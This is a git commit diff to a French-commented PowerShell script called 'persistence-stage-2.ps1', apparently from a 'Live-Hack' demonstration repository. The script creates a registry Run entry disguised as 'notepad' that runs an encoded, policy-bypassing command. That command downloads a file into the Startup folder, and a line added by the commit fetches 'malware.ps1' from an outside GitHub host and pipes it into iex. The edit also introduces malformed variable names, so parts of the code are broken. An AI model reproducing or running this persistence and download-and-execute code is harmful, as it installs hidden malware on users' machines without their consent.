16e8472e8b3bfe89d85fcb71429eff872914c6c7
Melfice60 <96183356+Melfice60@users.noreply.github.com>
2024-06-05 14:36:15 +0200

    Update persistence-stage-2.ps1

--- persistence-stage-2.ps1
+++ persistence-stage-2.ps1
@@ -1,8 +1,10 @@
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
 # Définition de la commande PowerShell à exécuter au démarrage
-$commande = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"
-$commandeBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commande))
+$commande-1 = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"
+
+$commandeBase64-1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commande))
 
 # Création de la nouvelle valeur dans la clé de Registre "Run"
-New-ItemProperty -Path $regPath -Name "notepad" -Value "powershell.exe -ExecutionPolicy Bypass -EncodedCommand '$commandeBase64'" -PropertyType String -Force | Out-Null
+New-ItemProperty -Path $regPath -Name "notepad" -Value "powershell.exe -ExecutionPolicy Bypass -EncodedCommand '$commandeBase64-1'" -PropertyType String -Force | Out-Null
+pwsh -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/malware.ps1 -UseBasicParsing|iex'
